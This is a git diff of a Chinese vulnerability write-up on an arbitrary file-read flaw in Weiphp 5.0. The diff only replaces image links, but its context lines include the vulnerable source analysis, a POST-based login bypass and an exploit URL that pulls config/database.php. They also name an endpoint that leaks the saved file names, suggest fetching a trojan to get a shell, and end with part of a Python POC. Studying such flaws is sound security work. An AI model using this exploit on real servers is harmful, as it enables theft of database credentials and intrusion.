@@ -16,7 +16,7 @@ Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等�
 
 参考官方手册创建网站即可
 
-![](image/weiphp-1.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## FOFA
 
@@ -30,7 +30,7 @@ Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等�
 
 漏洞函数:**_download_imgage**
 
-![](image/weiphp-2.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 public function _download_imgage($media_id, $picUrl = '', $dd = null)
@@ -103,7 +103,7 @@ $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-
 
 向下对变量**$picUrl** 是否为空进行判断，并判断是否进行登录，这里使用**POST**传参进行验证登录绕过，跳转到else语句下
 
-![](image/weiphp-3.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 else {
@@ -133,7 +133,7 @@ $content = wp_file_get_contents($picUrl);
 
 函数文件位置 **application\common.php**
 
-![](image/weiphp-4.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析
 
@@ -155,19 +155,19 @@ $res = file_put_contents($picPath, $content);
 /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
 ```
 
-![](image/weiphp-5.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 查看目录**/public/uploads/picture/**，并用记事本打开写入的jpg文件
 
-![](image/weiphp-6.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell
 
-![](image/weiphp-7.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法
 
-![](image/weiphp-8.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 if ($res) {
@@ -188,7 +188,7 @@ if ($res) {
 
 函数位置:**application\home\model\Picture.php**
 
-![](image/weiphp-9.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 function addFile($file)
@@ -220,11 +220,11 @@ $id = $this->insertGetId($data);
 
 我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了
 
-![](image/weiphp-10.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方
 
-![](image/weiphp-11.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-11.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 找到一处可以利用的地方
 
@@ -255,13 +255,13 @@ function get_wpid($wpid = '')
 
 查看 WPID 的定义，文件位置在**config\weiphp_define.php**
 
-![](image/weiphp-12.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-12.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名
 
 访问地址: **http://webphp/public/index.php/home/file/user_pids**
 
-![](image/weiphp-13.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-13.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 可以看到文件名，根据url地址访问选择下载即可
 
@@ -334,4 +334,4 @@ if __name__ == '__main__':
     image_url = POC_2(target_url)
 ```
 
-![](image/weiphp-14.png)
+![](http://wikioss.peiqi.tech/vuln/weiphp-14.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
